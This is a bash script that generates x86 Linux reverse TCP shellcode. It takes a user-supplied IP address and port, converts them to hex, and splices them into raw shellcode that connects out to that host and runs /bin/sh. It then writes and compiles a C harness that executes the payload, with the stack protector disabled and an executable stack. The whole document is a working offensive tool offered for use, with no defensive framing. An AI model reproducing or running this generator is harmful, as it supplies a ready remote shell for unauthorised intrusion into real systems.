#!/bin/bash
echo "========== HEX SHELL CODE GENERATOR - Reverse TCP x86 Linux ==========="
read -p "Enter the Ip address - " ip
read -p "Enter port number - " p
echo "[+] Setting up reverse shell Ip = "$ip
ip=`echo "\""$ip"\""`
lol=`python -c "import socket; print '0x%04x' % socket.htons("$p")"`
echo "[+] Your hex style port is "$lol
lollol=`python -c "import socket,struct;print hex(struct.unpack('<L', socket.inet_aton("$ip"))[0])"`
lollol=`echo "\""$lollol"\""`
l=`python -c "import socket;g="$lollol";print g[2:].zfill(8)"`
port=`echo "\x"${lol:4:2}"\x"${lol:2:2}${lol:2:0}`
ipas=`echo "\x"${l:6:2}"\x"${l:4:2}"\x"${l:2:2}"\x"${l:0:2}`
echo "[+] Your hex style Ip is "$ipas
echo "[+] Generating shellcode for newly set ip and port......"
hexshell=`echo "\"""\x6a\x66\x58\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\x99\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68"$ipas"\x66\x68"$port"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\x6a\x66\x58\x6a\x03\x5b\xcd\x80\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80""\""`
echo "Shellcode - "$hexshell
echo "[+] Pasting shellcode in C program ..."
(
cat <<EOF
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
$hexshell;
main()
{
  printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
EOF
) > shellcode.c
echo "[+] Compiling shellcode.c for executable shellcode...."
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
echo "[+] Done Sir! Enjoy ;)"
